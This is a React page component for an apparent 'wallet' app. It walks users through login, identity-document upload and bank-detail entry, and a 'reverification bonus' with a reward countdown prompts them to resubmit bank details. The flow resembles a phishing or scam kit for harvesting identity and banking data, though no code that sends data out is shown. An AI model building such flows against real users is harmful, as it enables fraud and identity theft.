import { useState, useEffect } from "react";
import LoginScreen from "@/components/LoginScreen";
import WelcomeScreen from "@/components/WelcomeScreen";
import DocumentUploadScreen from "@/components/DocumentUploadScreen";
import BankDetailsScreen from "@/components/BankDetailsScreen";
import DashboardScreen from "@/components/DashboardScreen";
import BonusScreen from "@/components/BonusScreen";
import { useUserProgress } from "@/hooks/useUserProgress";

type Screen = "login" | "welcome" | "documents" | "bank" | "bonus" | "dashboard";

const SESSION_KEYS = [
  "wallet_session_token",
  "wallet_user_email",
  "wallet_user_name",
  "wallet_login_ts",
  "docs_submitted",
  "bank_submitted",
  "reverification_bonus",
  "reward_countdown_deadline",
];

const Index = () => {
  const { progress, loading, login, submitDocs, submitBank } = useUserProgress();
  const [screen, setScreen] = useState<Screen>("login");
  const [userName, setUserName] = useState("");
  const [isReverification, setIsReverification] = useState(false);

  useEffect(() => {
    if (loading) return;
    if (progress) {
      setUserName(progress.userName);
      if (progress.bankSubmitted) {
        setScreen("dashboard");
      } else if (progress.docsSubmitted) {
        setScreen("bank");
      } else {
        setScreen("welcome");
      }
    }
  }, [loading, progress]);

  const handleLogin = async (email: string) => {
    const p = await login(email);
    if (p) {
      setUserName(p.userName);
      if (p.bankSubmitted) {
        setScreen("dashboard");
      } else if (p.docsSubmitted) {
        setScreen("bank");
      } else {
        setScreen("welcome");
      }
    }
  };

  const handleDocsSubmit = async () => {
    await submitDocs();
    setScreen("bank");
  };

  const handleBankSubmit = async (method: string, details: Record<string, string>) => {
    await submitBank(method, details);
    setIsReverification(false);
    setScreen("dashboard");
  };

  const handleReverifyClick = () => {
    setIsReverification(true);
    localStorage.setItem("reverification_bonus", "true");
    setScreen("bonus");
  };

  const handleBonusContinue = () => {
    setScreen("bank");
  };

  const handleFullReset = () => {
    SESSION_KEYS.forEach((k) => localStorage.removeItem(k));
    setUserName("");
    setIsReverification(false);
    setScreen("login");
  };

  if (loading) {
    return (
      <div className="max-w-md mx-auto min-h-screen bg-background shadow-lg flex items-center justify-center">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-foreground" />
      </div>
    );
  }

  return (
    <div className="max-w-md mx-auto min-h-screen bg-background shadow-lg">
      <div key={screen} className="animate-fade-in">
        {screen === "login" && <LoginScreen onLogin={handleLogin} />}
        {screen === "welcome" && (
          <WelcomeScreen userName={userName} onContinue={() => setScreen("documents")} />
        )}
        {screen === "documents" && (
          <DocumentUploadScreen userName={userName} onSubmit={handleDocsSubmit} />
        )}
        {screen === "bank" && (
          <BankDetailsScreen
            userName={userName}
            onSubmit={handleBankSubmit}
            isReverification={isReverification}
          />
        )}
        {screen === "bonus" && (
          <BonusScreen userName={userName} onContinue={handleBonusContinue} />
        )}
        {screen === "dashboard" && (
          <DashboardScreen
            userName={userName}
            onReverifyBank={handleReverifyClick}
            onFullReset={handleFullReset}
          />
        )}
      </div>
    </div>
  );
};

export default Index;
